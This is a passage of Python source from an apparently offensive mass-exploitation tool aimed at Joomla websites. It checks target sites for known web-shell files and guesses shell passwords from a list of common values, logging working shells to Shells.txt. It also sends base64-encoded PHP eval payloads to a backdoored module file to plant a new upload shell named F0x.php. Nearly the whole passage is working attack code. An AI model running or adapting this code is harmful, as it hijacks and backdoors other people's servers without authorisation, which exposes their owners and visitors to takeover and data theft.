													if ' type="file"' in sh_check or ' type=\'file\'' in sh_check or ' type= "file"' in sh_check or ' type= \'file\'' in sh_check or ' type = "file"' in sh_check or ' type = \'file\'' in sh_check or ' type ="file"' in sh_check or ' type =\'file\'' in sh_check or ' type=file' in sh_check or ' type =file' in sh_check or ' type= file' in sh_check or ' type = file' in sh_check or 'Upload</a> ]</li><li>[' in sh_check or 'upload</a><li><a>Sym' in sh_check :
														print(' # '+site +'/ --> {}[Vuln]'.format(fg))
														with open('Shells.txt', mode='a') as d:
															d.write(SH12_O+shell+'.php')
													elif ' name=pass' in sh_check :
														nhzgrf = requests.post(SH12_O+shell+'.php',data=password_nhzgrf,timeout=15).content
														if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
															print(' # '+site +'/ --> {}[Vuln]'.format(fg))
															with open('Shells.txt', mode='a') as d:
																d.write(SH12_O+shell+'.php'+'#nhzgrf')
														else :
															proot = requests.post(SH12_O+shell+'.php',data=password_root,timeout=15).content
															if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
																print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH12_O+shell+'.php'+'#root')
															else :
																pr00t = requests.post(SH12_O+shell+'.php',data=password_r00t,timeout=15).content
																if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
																	print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																	with open('Shells.txt', mode='a') as d:
																		d.write(SH12_O+shell+'.php'+'#r00t')
																else :
																	padmin = requests.post(SH12_O+shell+'.php',data=password_admin,timeout=15).content
																	if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
																		print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																		with open('Shells.txt', mode='a') as d:
																			d.write(SH12_O+shell+'.php'+'#admin')
																	else :
																		pt00r = requests.post(SH12_O+shell+'.php',data=password_t00r,timeout=15).content
																		if ' type="file"' in pt00r or ' type=\'file\'' in pt00r or ' type= "file"' in pt00r or ' type= \'file\'' in pt00r or ' type = "file"' in pt00r or ' type = \'file\'' in pt00r or ' type ="file"' in pt00r or ' type =\'file\'' in pt00r or ' type=file' in pt00r or ' type =file' in pt00r or ' type= file' in pt00r or ' type = file' in pt00r :
																			print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																			with open('Shells.txt', mode='a') as d:
																				d.write(SH12_O+shell+'.php'+'#t00r')
																		else :
																			p123 = requests.post(SH12_O+shell+'.php',data=password_123,timeout=15).content
																			if ' type="file"' in p123 or ' type=\'file\'' in p123 or ' type= "file"' in p123 or ' type= \'file\'' in p123 or ' type = "file"' in p123 or ' type = \'file\'' in p123 or ' type ="file"' in p123 or ' type =\'file\'' in p123 or ' type=file' in p123 or ' type =file' in p123 or ' type= file' in p123 or ' type = file' in p123 :
																				print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																				with open('Shells.txt', mode='a') as d:
																					d.write(SH12_O+shell+'.php'+'#123')
																			else :
																				p1234 = requests.post(SH12_O+shell+'.php',data=password_1234,timeout=15).content
																				if ' type="file"' in p1234 or ' type=\'file\'' in p1234 or ' type= "file"' in p1234 or ' type= \'file\'' in p1234 or ' type = "file"' in p1234 or ' type = \'file\'' in p1234 or ' type ="file"' in p1234 or ' type =\'file\'' in p1234 or ' type=file' in p1234 or ' type =file' in p1234 or ' type= file' in p1234 or ' type = file' in p1234 :
																					print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																					with open('Shells.txt', mode='a') as d:
																						d.write(SH12_O+shell+'.php'+'#1234')
																				else :
																					p12345 = requests.post(SH12_O+shell+'.php',data=password_12345,timeout=15).content
																					if ' type="file"' in p12345 or ' type=\'file\'' in p12345 or ' type= "file"' in p12345 or ' type= \'file\'' in p12345 or ' type = "file"' in p12345 or ' type = \'file\'' in p12345 or ' type ="file"' in p12345 or ' type =\'file\'' in p12345 or ' type=file' in p12345 or ' type =file' in p12345 or ' type= file' in p12345 or ' type = file' in p12345 :
																						print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																						with open('Shells.txt', mode='a') as d:
																							d.write(SH12_O+shell+'.php'+'#12345')
																					else :
																						p123456 = requests.post(SH12_O+shell+'.php',data=password_123456,timeout=15).content
																						if ' type="file"' in p123456 or ' type=\'file\'' in p123456 or ' type= "file"' in p123456 or ' type= \'file\'' in p123456 or ' type = "file"' in p123456 or ' type = \'file\'' in p123456 or ' type ="file"' in p123456 or ' type =\'file\'' in p123456 or ' type=file' in p123456 or ' type =file' in p123456 or ' type= file' in p123456 or ' type = file' in p123456 :
																							print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																							with open('Shells.txt', mode='a') as d:
																								d.write(SH12_O+shell+'.php'+'#123456')
																						else :
																							p123123 = requests.post(SH12_O+shell+'.php',data=password_123123,timeout=15).content
																							if ' type="file"' in p123123 or ' type=\'file\'' in p123123 or ' type= "file"' in p123123 or ' type= \'file\'' in p123123 or ' type = "file"' in p123123 or ' type = \'file\'' in p123123 or ' type ="file"' in p123123 or ' type =\'file\'' in p123123 or ' type=file' in p123123 or ' type =file' in p123123 or ' type= file' in p123123 or ' type = file' in p123123 :
																								print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																								with open('Shells.txt', mode='a') as d:
																									d.write(SH12_O+shell+'.php'+'#123123')
																							else :
																								p123321 = requests.post(SH12_O+shell+'.php',data=password_123321,timeout=15).content
																								if ' type="file"' in p123321 or ' type=\'file\'' in p123321 or ' type= "file"' in p123321 or ' type= \'file\'' in p123321 or ' type = "file"' in p123321 or ' type = \'file\'' in p123321 or ' type ="file"' in p123321 or ' type =\'file\'' in p123321 or ' type=file' in p123321 or ' type =file' in p123321 or ' type= file' in p123321 or ' type = file' in p123321 :
																									print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																									with open('Shells.txt', mode='a') as d:
																										d.write(SH12_O+shell+'.php'+'#123321')
																								else :
																									p123456789 = requests.post(SH12_O+shell+'.php',data=password_123456789,timeout=15).content
																									if ' type="file"' in p123456789 or ' type=\'file\'' in p123456789 or ' type= "file"' in p123456789 or ' type= \'file\'' in p123456789 or ' type = "file"' in p123456789 or ' type = \'file\'' in p123456789 or ' type ="file"' in p123456789 or ' type =\'file\'' in p123456789 or ' type=file' in p123456789 or ' type =file' in p123456789 or ' type= file' in p123456789 or ' type = file' in p123456789 :
																										print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																										with open('Shells.txt', mode='a') as d:
																											d.write(SH12_O+shell+'.php'+'#123456789')
																									else :
																										p1234567890 = requests.post(SH12_O+shell+'.php',data=password_1234567890,timeout=15).content
																										if ' type="file"' in p1234567890 or ' type=\'file\'' in p1234567890 or ' type= "file"' in p1234567890 or ' type= \'file\'' in p1234567890 or ' type = "file"' in p1234567890 or ' type = \'file\'' in p1234567890 or ' type ="file"' in p1234567890 or ' type =\'file\'' in p1234567890 or ' type=file' in p1234567890 or ' type =file' in p1234567890 or ' type= file' in p1234567890 or ' type = file' in p1234567890 :
																											print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																											with open('Shells.txt', mode='a') as d:
																												d.write(SH12_O+shell+'.php'+'#1234567890')
																										else :
																											phaurgeulis = requests.post(SH12_O+shell+'.php',data=password_haurgeulis,timeout=15).content
																											if 'Andela1C3' in phaurgeulis  :
																												print(' # '+site +'/ --> {}[Vuln]'.format(fg))
																												with open('Shells.txt', mode='a') as d:
																													d.write(SH12_O+shell+'.php'+'#haurgeulis')
																											else :
																												print(' # '+site +' --> {}[Failed]'.format(fr))
													else :
														print(' # '+site +' --> {}[Failed]'.format(fr))
											else :
												site_check = requests.get(site+'/',timeout=15).content
												if ' type="file"' in site_check or ' type=\'file\'' in site_check or ' type= "file"' in site_check or ' type= \'file\'' in site_check or ' type = "file"' in site_check or ' type = \'file\'' in site_check or ' type ="file"' in site_check or ' type =\'file\'' in site_check or ' type=file' in site_check or ' type =file' in site_check or ' type= file' in site_check or ' type = file' in site_check :	
													print(' # '+site +'/ --> {}[Succeeded]'.format(fg))
													with open('UPloaders-Failed.txt', mode='a') as ccc:
														ccc.write(site+'/ [Vuln Register]')
												else :
													up_check = requests.get(SH13_O,timeout=15).content
													if ' type="file"' in up_check or ' type=\'file\'' in up_check or ' type= "file"' in up_check or ' type= \'file\'' in up_check or ' type = "file"' in up_check or ' type = \'file\'' in up_check or ' type ="file"' in up_check or ' type =\'file\'' in up_check or ' type=file' in up_check or ' type =file' in up_check or ' type= file' in up_check or ' type = file' in up_check or 'Upload</a> ]</li><li>[' in up_check or 'upload</a><li><a>Sym' in up_check :	
														print(' # '+site +'/ --> {}[Succeeded]'.format(fg))
														with open('UPloaders.txt', mode='a') as cc:
															cc.write(SH13_O+' [Vuln]')
													else :
														upload_check = requests.get(SH14_O,timeout=15).content
														if ' type="file"' in upload_check or ' type=\'file\'' in upload_check or ' type= "file"' in upload_check or ' type= \'file\'' in upload_check or ' type = "file"' in upload_check or ' type = \'file\'' in upload_check or ' type ="file"' in upload_check or ' type =\'file\'' in upload_check or ' type=file' in upload_check or ' type =file' in upload_check or ' type= file' in upload_check or ' type = file' in upload_check or 'Upload</a> ]</li><li>[' in upload_check or 'upload</a><li><a>Sym' in upload_check :
															print(' # '+site +'/ --> {}[Succeeded]'.format(fg))
															with open('UPloaders.txt', mode='a') as cc:
																cc.write(SH14_O+' [Vuln]')
														else :
															shell_check = requests.get(SH15_O,timeout=15).content
															if ' type="file"' in shell_check or ' type=\'file\'' in shell_check or ' type= "file"' in shell_check or ' type= \'file\'' in shell_check or ' type = "file"' in shell_check or ' type = \'file\'' in shell_check or ' type ="file"' in shell_check or ' type =\'file\'' in shell_check or ' type=file' in shell_check or ' type =file' in shell_check or ' type= file' in shell_check or ' type = file' in shell_check or 'Upload</a> ]</li><li>[' in shell_check or 'upload</a><li><a>Sym' in shell_check :
																print(' # '+site +'/ --> {}[Succeeded]'.format(fg))
																with open('Shells.txt', mode='a') as d:
																	d.write(SH15_O+'')
															else :
																print(' # '+site +' --> {}[Failed]'.format(fr))
	except : 
		print(' # '+site +' --> {}[Failed]'.format(fr))

def Joomla2(site):		
	try :
		site = URL(site)
		
		SH1_J2 = site+'/modules/mod_simplefileuploadv1.3/elements/Clean.php'
		SH2_J2 = site+'/modules/mod_simplefileuploadv1.3/elements/udd.php'
		SH3_J2 = site+'/libraries/joomla/css.php'
		SH4_J2 = site+'/libraries/joomla/jmails.php?u'
		SH5_J2 = site+'/libraries/joomla/jmail.php?u'
		SH6_J2 = site+'/images/vuln.php'
		SH7_J2 = site+'/tmp/vuln.php'
		SH8_J2 = site+'/XxX.php'
		SH9_J2 = site+'/Marvins.php'
		SH10_J2 = site+'/rxr.php?rxr'
		SH11_J2 = site+'/modules/modules/modules.php'
		SH12_J2 = site+'/olux.php'
		SH13_J2 = site+'/indoxploit.php'
		SH14_J2 = site+'/error.php'
		SH15_J2 = site+'/RxR.php'
		SH16_J2 = site+'/components/com_b2jcontact/izoc.php'
		SH17_J2 = site+'/V3.php'
		SH18_J2 = site+'/V5.php'
		SH19_J2 = site+'/wso.php'
		
		try :
			wso_check = requests.get(SH19_J2,timeout=15).content
			modules_check = requests.get(SH11_J2,timeout=15).content
		except :
			pass
			
		modules_upload = {'itongtong':'eval(base64_decode("JGZvPWZvcGVuKCRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl0uIi9GMHgucGhwIiwidyIpOwpmd3JpdGUoJGZvLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFOQ21WamFHOGdJa2hoWTJ0bFpDQkNlU0JCYm05dWVXMXZkWE5HYjNoY2JpSTdEUXA3RFFva2MyRjNNU0E5SUNSZlJrbE1SVk5iSjJacGJHVW5YVnNuZEcxd1gyNWhiV1VuWFRzTkNpUnpZWGN5SUQwZ0pGOUdTVXhGVTFzblptbHNaU2RkV3lkdVlXMWxKMTA3RFFwbFkyaHZJQ0k4Wm05eWJTQnRaWFJvYjJROUoxQlBVMVFuSUdWdVkzUjVjR1U5SjIxMWJIUnBjR0Z5ZEM5bWIzSnRMV1JoZEdFblBnMEtQR2x1Y0hWMElIUjVjR1U5SjJacGJHVW5ibUZ0WlQwblptbHNaU2NnTHo0TkNqeHBibkIxZENCMGVYQmxQU2R6ZFdKdGFYUW5JSFpoYkhWbFBTZDFjR3h2WVdRZ2MyaGxiR3duSUM4K0RRbzhMMlp2Y20wK0lqc05DbTF2ZG1WZmRYQnNiMkZrWldSZlptbHNaU2drYzJGM01Td2tjMkYzTWlrN0RRcDlEUW8vUGc9PScpKTs="));'}		
		modules_upload2 = {'itongtong':'eval(base64_decode("JGZvPWZvcGVuKCJGMHgucGhwIiwidyIpOwpmd3JpdGUoJGZvLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFOQ21WamFHOGdJa2hoWTJ0bFpDQkNlU0JCYm05dWVXMXZkWE5HYjNoY2JpSTdEUXA3RFFva2MyRjNNU0E5SUNSZlJrbE1SVk5iSjJacGJHVW5YVnNuZEcxd1gyNWhiV1VuWFRzTkNpUnpZWGN5SUQwZ0pGOUdTVXhGVTFzblptbHNaU2RkV3lkdVlXMWxKMTA3RFFwbFkyaHZJQ0k4Wm05eWJTQnRaWFJvYjJROUoxQlBVMVFuSUdWdVkzUjVjR1U5SjIxMWJIUnBjR0Z5ZEM5bWIzSnRMV1JoZEdFblBnMEtQR2x1Y0hWMElIUjVjR1U5SjJacGJHVW5ibUZ0WlQwblptbHNaU2NnTHo0TkNqeHBibkIxZENCMGVYQmxQU2R6ZFdKdGFYUW5JSFpoYkhWbFBTZDFjR3h2WVdRZ2MyaGxiR3duSUM4K0RRbzhMMlp2Y20wK0lqc05DbTF2ZG1WZmRYQnNiMkZrWldSZlptbHNaU2drYzJGM01Td2tjMkYzTWlrN0RRcDlEUW8vUGc9PScpKTs="));'}
		modules_upload3 = {'itongtong':'eval(base64_decode("JGZvPWZvcGVuKCRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl0uIi9pbWFnZXMvRjB4LnBocCIsInciKTsKZndyaXRlKCRmbyxiYXNlNjRfZGVjb2RlKCdQRDl3YUhBTkNtVmphRzhnSWtoaFkydGxaQ0JDZVNCQmJtOXVlVzF2ZFhOR2IzaGNiaUk3RFFwN0RRb2tjMkYzTVNBOUlDUmZSa2xNUlZOYkoyWnBiR1VuWFZzbmRHMXdYMjVoYldVblhUc05DaVJ6WVhjeUlEMGdKRjlHU1V4RlUxc25abWxzWlNkZFd5ZHVZVzFsSjEwN0RRcGxZMmh2SUNJOFptOXliU0J0WlhSb2IyUTlKMUJQVTFRbklHVnVZM1I1Y0dVOUoyMTFiSFJwY0dGeWRDOW1iM0p0TFdSaGRHRW5QZzBLUEdsdWNIVjBJSFI1Y0dVOUoyWnBiR1VuYm1GdFpUMG5abWxzWlNjZ0x6NE5DanhwYm5CMWRDQjBlWEJsUFNkemRXSnRhWFFuSUhaaGJIVmxQU2QxY0d4dllXUWdjMmhsYkd3bklDOCtEUW84TDJadmNtMCtJanNOQ20xdmRtVmZkWEJzYjJGa1pXUmZabWxzWlNna2MyRjNNU3drYzJGM01pazdEUXA5RFFvL1BnPT0nKSk7"));'}
		
		if 'Mini shell' in requests.get(SH1_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[SimpleFileUpload]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH1_J2+'')
		elif 'Shell Uploader' in requests.get(SH2_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[SimpleFileUpload]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH2_J2+'')
		elif 'walex says Fuck Off Kids:' in requests.get(SH3_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[RCE]'.format(fg))
			if 'BlesseD MAILER 2014' in requests.get(SH4_J2,timeout=15).content :
				if 'w4l3XzY3 Mailer' in requests.get(SH5_J2,timeout=15).content  :
					with open('Shells.txt', mode='a') as d:
						d.write(SH3_J2+' | '+SH4_J2+' | '+SH5_J2+'')
				else :
					with open('Shells.txt', mode='a') as d:
						d.write(SH3_J2+' | '+SH4_J2+'')
			else :
				with open('Shells.txt', mode='a') as d:
					d.write(SH3_J2+'')
		elif 'BlesseD MAILER 2014' in requests.get(SH4_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[RCE]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH4_J2+'')
		elif 'w4l3XzY3 Mailer' in requests.get(SH5_J2,timeout=15).content  :
			print(' # '+site +'/ --> {}[RCE]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH5_J2+'')
		elif 'Windows' in wso_check and 'Upload file:' in wso_check :
			print(' # '+site +'/ --> {}[WSO]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH19_J2+'')
		elif '<title>Vuln!! patch it Now!</title>' in requests.get(SH6_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[ExploitJok3r]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH6_J2+'')
		elif '<title>Vuln!! patch it Now!</title>' in requests.get(SH7_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[ExploitJok3r]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH7_J2+'')
		elif 'Tryag File Manager' in requests.get(SH8_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[TryagFileManager]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH8_J2+'')
		elif 'config root man' in requests.get(SH9_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[WebShell]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH9_J2+'')
		elif 'RxR HaCkEr' in requests.get(SH10_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[RxR HaCkEr]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH10_J2+'')
		elif 'WSO 2.6' in requests.get(SH12_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[Olux]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH12_J2+'')
		elif '<title>IndoXploit</title>' in requests.get(SH13_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[IndoXploit]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH13_J2+'#IndoXploit')
		elif 'X_Shell' in requests.get(SH14_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[Hamdida]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH14_J2+'')
		elif 'RxR HaCkEr' in requests.get(SH15_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[RxR HaCkEr]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH15_J2+'')
		elif 'izocin' in requests.get(SH16_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[IZocin]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH16_J2+'')
		elif 'Dr HeX' in requests.get(SH17_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[DrHeX]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH17_J2+'#kinghex')
		elif 'Dr HeX' in requests.get(SH18_J2,timeout=15).content :
			print(' # '+site +'/ --> {}[DrHeX]'.format(fg))
			with open('Shells.txt', mode='a') as d:
				d.write(SH18_J2+'#kinghex')
		elif '<' not in modules_check and '/modules/modules' in  modules_check :
			upShell =  requests.post(SH11_J2,data=modules_upload,timeout=15)
			check = requests.get(site+'/F0x.php',timeout=15).content
			if 'AnonymousFox' in check :
				print(' # '+site +'/ --> {}[ChinafansModules]'.format(fg))
				with open('Shells.txt', mode='a') as d:
					d.write(SH11_J2+'#itongtong [POST] | {}/F0x.php [Succeeded]'.format(site))
			else :
				upShell =  requests.post(SH11_J2,data=modules_upload2,timeout=15)
				check = requests.get(site+'/modules/modules/F0x.php',timeout=15).content
				if 'AnonymousFox' in check :
					print(' # '+site +'/ --> {}[ChinafansModules]'.format(fg))
					with open('Shells.txt', mode='a') as d:
						d.write(SH11_J2+'#itongtong [POST] | {}/modules/modules/F0x.php [Succeeded]'.format(site))
				else :
					upShell =  requests.post(SH11_J2,data=modules_upload3,timeout=15)
					check = requests.get(site+'/images/F0x.php',timeout=15).content
					if 'AnonymousFox' in check :
						print(' # '+site +'/ --> {}[ChinafansModules]'.format(fg))
						with open('Shells.txt', mode='a') as d:
							d.write(SH11_J2+'#itongtong [POST] | {}/images/F0x.php [Succeeded]'.format(site))
					else :
						print(' # '+site +' --> {}[Failed]'.format(fr))
		else :
			print(' # '+site +' --> {}[Failed]'.format(fr))
		
	except : 
		print(' # '+site +' --> {}[Failed]'.format(fr))

		
def Joomla1(site):
	try :
		site = URL(site)
		pattern_themes1 = re.compile('templates/(.*)/favicon.ico')
		pattern_themes2 = re.compile('templates/(.*)/js/')
		pattern_themes3 = re.compile('templates/(.*)/css/')
		pattern_themes4 = re.compile('(.*)/')
		
		SH22_J = site+'/up.php'
		SH23_J = site+'/upload.php'
		SH24_J = site+'/shell.php'	
		
		try :
			site_check = requests.get(site+'/',timeout=15).content
			up_check = requests.get(SH22_J,timeout=15).content
			upload_check = requests.get(SH23_J,timeout=15).content
			shell_check = requests.get(SH24_J,timeout=15).content	
		except :
			pass		
		
		if re.findall(pattern_themes1,site_check):
			theme = re.findall(pattern_themes1,site_check)
			theme = theme[0]
			while re.findall(pattern_themes4,theme) :
				theme = re.findall(pattern_themes4,theme)
				theme = theme[0]
		elif re.findall(pattern_themes2,site_check):
			theme = re.findall(pattern_themes2,site_check)
			theme = theme[0]
			while re.findall(pattern_themes4,theme) :
				theme = re.findall(pattern_themes4,theme)
				theme = theme[0]
		elif re.findall(pattern_themes3,site_check):
			theme = re.findall(pattern_themes3,site_check)
			theme = theme[0]
			while re.findall(pattern_themes4,theme) :
				theme = re.findall(pattern_themes4,theme)
				theme = theme[0]
		else :
			theme = 'system'				


		SH1_J = site+'/administrator/templates/bluestork/index.php'
		SH2_J = site+'/administrator/templates/bluestork/error.php'
		SH3_J = site+'/administrator/templates/hathor/index.php'
		SH4_J = site+'/administrator/templates/hathor/error.php'
		SH5_J = site+'/administrator/templates/isis/index.php'
		SH6_J = site+'/administrator/templates/isis/error.php'
		SH7_J = site+'/templates/beez/index.php'
		SH8_J = site+'/templates/ja_purity/index.php'
		SH9_J = site+'/templates/rhuk_milkyway/index.php'
		SH10_J = site+'/templates/'+theme+'/index.php'
		SH11_J = site+'/templates/'+theme+'/error.php'
		SH12_J = site+'/templates/beez3/index.php'
		SH13_J = site+'/templates/beez3/error.php'
		SH14_J = site+'/templates/beez5/index.php'
		SH15_J = site+'/templates/beez5/error.php'
		SH16_J = site+'/templates/beez_20/index.php'
		SH17_J = site+'/templates/beez_20/error.php'
		SH18_J = site+'/templates/protostar/index.php'
		SH19_J = site+'/templates/protostar/error.php'
		SH20_J = site+'/templates/atomic/index.php'
		SH21_J = site+'/templates/atomic/error.php'		
		
		password_nhzgrf = {'pass':'nhzgrf'}
		password_root = {'pass':'root'}
		password_r00t = {'pass':'r00t'}
		password_admin = {'pass':'admin'}
		password_t00r = {'pass':'t00r'}
		password_123 = {'pass':'123'}
		password_1234 = {'pass':'1234'}
		password_12345 = {'pass':'12345'}
		password_123456 = {'pass':'123456'}
		password_123123 = {'pass':'123123'}
		password_123321 = {'pass':'123321'}
		password_123456789 = {'pass':'123456789'}
		password_1234567890 = {'pass':'1234567890'}
		password_haurgeulis = {'pass':'haurgeulis'}
		password_rehan = {'password':'rehan'}

		if ' type="file"' in site_check or ' type=\'file\'' in site_check or ' type= "file"' in site_check or ' type= \'file\'' in site_check or ' type = "file"' in site_check or ' type = \'file\'' in site_check or ' type ="file"' in site_check or ' type =\'file\'' in site_check or ' type=file' in site_check or ' type =file' in site_check or ' type= file' in site_check or ' type = file' in site_check :	
			print(' # '+site +'/ --> {}[Succeeded]'.format(fg))
			with open('UPloaders-Failed.txt', mode='a') as ccc:
				ccc.write(site+'/ [Vuln Register]')				
		else :
			if ' type="file"' in up_check or ' type=\'file\'' in up_check or ' type= "file"' in up_check or ' type= \'file\'' in up_check or ' type = "file"' in up_check or ' type = \'file\'' in up_check or ' type ="file"' in up_check or ' type =\'file\'' in up_check or ' type=file' in up_check or ' type =file' in up_check or ' type= file' in up_check or ' type = file' in up_check or 'Upload</a> ]</li><li>[' in up_check or 'upload</a><li><a>Sym' in up_check :	
				print(' # '+site +'/ --> {}[Succeeded]'.format(fg))
				with open('UPloaders.txt', mode='a') as cc:
					cc.write(SH22_J+' [Vuln]')
			else :
				if ' type="file"' in upload_check or ' type=\'file\'' in upload_check or ' type= "file"' in upload_check or ' type= \'file\'' in upload_check or ' type = "file"' in upload_check or ' type = \'file\'' in upload_check or ' type ="file"' in upload_check or ' type =\'file\'' in upload_check or ' type=file' in upload_check or ' type =file' in upload_check or ' type= file' in upload_check or ' type = file' in upload_check or 'Upload</a> ]</li><li>[' in upload_check or 'upload</a><li><a>Sym' in upload_check :
					print(' # '+site +'/ --> {}[Succeeded]'.format(fg))
					with open('UPloaders.txt', mode='a') as cc:
						cc.write(SH23_J+' [Vuln]')
				else :
					if ' type="file"' in shell_check or ' type=\'file\'' in shell_check or ' type= "file"' in shell_check or ' type= \'file\'' in shell_check or ' type = "file"' in shell_check or ' type = \'file\'' in shell_check or ' type ="file"' in shell_check or ' type =\'file\'' in shell_check or ' type=file' in shell_check or ' type =file' in shell_check or ' type= file' in shell_check or ' type = file' in shell_check or 'Upload</a> ]</li><li>[' in shell_check or 'upload</a><li><a>Sym' in shell_check :
						print(' # '+site +'/ --> {}[Succeeded]'.format(fg))
						with open('Shells.txt', mode='a') as d:
							d.write(SH24_J+'')
					else :		
						SH1_J_content = requests.get(SH1_J,timeout=15).content
						if ' type="file"' in SH1_J_content or ' type=\'file\'' in SH1_J_content or ' type= "file"' in SH1_J_content or ' type= \'file\'' in SH1_J_content or ' type = "file"' in SH1_J_content or ' type = \'file\'' in SH1_J_content or ' type ="file"' in SH1_J_content or ' type =\'file\'' in SH1_J_content or ' type=file' in SH1_J_content or ' type =file' in SH1_J_content or ' type= file' in SH1_J_content or ' type = file' in SH1_J_content or 'Upload</a> ]</li><li>[' in SH1_J_content or 'upload</a><li><a>Sym' in SH1_J_content :
							print(' # '+site +'/ --> {}[bluestork]'.format(fg))
							with open('Shells.txt', mode='a') as d:
								d.write(SH1_J+'')
						elif ' name=pass' in SH1_J_content :
							nhzgrf = requests.post(SH1_J,data=password_nhzgrf,timeout=15).content
							if ' type="file"' in nhzgrf or ' type=\'file\'' in nhzgrf or ' type= "file"' in nhzgrf or ' type= \'file\'' in nhzgrf or ' type = "file"' in nhzgrf or ' type = \'file\'' in nhzgrf or ' type ="file"' in nhzgrf or ' type =\'file\'' in nhzgrf or ' type=file' in nhzgrf or ' type =file' in nhzgrf or ' type= file' in nhzgrf or ' type = file' in nhzgrf :
								print(' # '+site +'/ --> {}[bluestork]'.format(fg))
								with open('Shells.txt', mode='a') as d:
									d.write(SH1_J+'#nhzgrf')
							else :
								proot = requests.post(SH1_J,data=password_root,timeout=15).content
								if ' type="file"' in proot or ' type=\'file\'' in proot or ' type= "file"' in proot or ' type= \'file\'' in proot or ' type = "file"' in proot or ' type = \'file\'' in proot or ' type ="file"' in proot or ' type =\'file\'' in proot or ' type=file' in proot or ' type =file' in proot or ' type= file' in proot or ' type = file' in proot :
									print(' # '+site +'/ --> {}[bluestork]'.format(fg))
									with open('Shells.txt', mode='a') as d:
										d.write(SH1_J+'#root')
								else :
									pr00t = requests.post(SH1_J,data=password_r00t,timeout=15).content
									if ' type="file"' in pr00t or ' type=\'file\'' in pr00t or ' type= "file"' in pr00t or ' type= \'file\'' in pr00t or ' type = "file"' in pr00t or ' type = \'file\'' in pr00t or ' type ="file"' in pr00t or ' type =\'file\'' in pr00t or ' type=file' in pr00t or ' type =file' in pr00t or ' type= file' in pr00t or ' type = file' in pr00t :
										print(' # '+site +'/ --> {}[bluestork]'.format(fg))
										with open('Shells.txt', mode='a') as d:
											d.write(SH1_J+'#r00t')
									else :
										padmin = requests.post(SH1_J,data=password_admin,timeout=15).content
										if ' type="file"' in padmin or ' type=\'file\'' in padmin or ' type= "file"' in padmin or ' type= \'file\'' in padmin or ' type = "file"' in padmin or ' type = \'file\'' in padmin or ' type ="file"' in padmin or ' type =\'file\'' in padmin or ' type=file' in padmin or ' type =file' in padmin or ' type= file' in padmin or ' type = file' in padmin :
											print(' # '+site +'/ --> {}[bluestork]'.format(fg))
											with open('Shells.txt', mode='a') as d:
												d.write(SH1_J+'#admin')
										else :
											pt00r = requests.post(SH1_J,data=password_t00r,timeout=15).content
